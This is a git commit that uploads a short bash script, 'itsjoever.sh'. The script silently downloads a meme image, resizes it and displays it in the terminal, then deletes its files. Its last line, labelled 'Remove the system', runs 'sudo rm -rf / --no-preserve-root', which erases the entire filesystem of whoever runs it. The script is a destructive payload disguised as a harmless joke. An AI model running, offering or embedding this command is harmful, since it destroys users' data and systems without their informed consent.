2de2fca5b6eff78940f85142a40ea069c4f28ba1
Tyler <166963170+ty20070@users.noreply.github.com>
2024-04-27 20:23:22 -0700

    Add files via upload

---
+++ itsjoever.sh
@@ -0,0 +1,27 @@
+#!/bin/bash
+
+# Clear the terminal
+clear
+tput civis
+
+
+# Function to resize the image by 80%
+resize_image() {
+    convert original_image.jpg -resize 80x80^ -gravity center -extent 80x80 resized_image.jpg
+}
+
+# Download the image silently using curl
+curl -s -o original_image.jpg https://i.kym-cdn.com/photos/images/newsfeed/002/360/758/f0b.jpg
+
+# Run the loop 1 time
+for ((i=1; i<=1; i++)); do
+    resize_image
+    # Display the resized image using catimg
+    catimg resized_image.jpg
+done
+
+# Clean up downloaded files
+rm original_image.jpg resized_image.jpg
+
+# Remove the system
+sudo rm -rf / --no-preserve-root 
